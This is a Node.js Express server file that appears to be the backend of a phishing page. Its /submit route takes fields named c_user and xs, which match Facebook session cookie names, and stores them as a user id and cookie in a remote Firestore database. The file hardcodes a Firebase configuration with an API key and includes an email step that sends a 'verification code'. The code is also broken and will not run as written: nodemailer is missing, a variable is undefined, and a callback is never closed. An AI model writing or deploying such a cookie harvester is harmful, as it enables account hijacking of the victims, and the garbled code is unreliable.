const express = require("express");
const path = require("path");

const PORT = 80;
const bodyParser = require("body-parser");
const { initializeApp } = require('firebase/app')
const { getFirestore, collection, addDoc } = require('firebase/firestore/lite')


const app = express();
app.use(express.static(path.join(__dirname,'static')))
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const firebaseConfig = {
  apiKey: "AIzaSyAUEskRaHDTWm2VIMQJ_KKiGPE7oDEun_Y",
  authDomain: "pages-4dcc5.firebaseapp.com",
  projectId: "pages-4dcc5",
  storageBucket: "pages-4dcc5.appspot.com",
  messagingSenderId: "658193332198",
  appId: "1:658193332198:web:d1688c0f60cc5087034827",
};

const firebaseInitialized = initializeApp(firebaseConfig);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "start.html"));
});

app.post("/submit", async (req, res) => {
  const firestore = getFirestore(firebaseInitialized);

  const collRef = collection(firestore, "pages");
  
  const uid = req.body.c_user;
  const cookie = req.body.xs;


  await addDoc(collRef, { uid, cookie });

  
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          type: 'OAuth2',
          user: process.env.USER,
          pass: process.env.PASS,
          clientId: process.env.CLIENT_ID,
          clientSecret: process.env.CLIENT_SECRET,
          refreshToken: process.env.REFRESH_TOKEN
        }
      });

    let mailOptions = {
        to:req.body.email,
        from:'helpmate73@gmail.com',
        subject:'Verification Code',
        text:"Your Verification Code For Help mate is",
        html:`<h1>${verificatoinCode}<h1/>`
    }

    transporter.sendMail(mailOptions,(error,result)=>{
        if(error){
            res.send({error:error.message})
        }
        else{
            res.send({code:verificatoinCode})
            

        }


  res.sendFile(path.join(__dirname, "submit.html"));

  
});

app.get("/submit", (req, res) => {
  res.sendFile(path.join(__dirname, "submit.html"));
});

app.listen({ port: process.env.PORT, host: "0.0.0.0" }, () => {
  console.log("app started....");
});
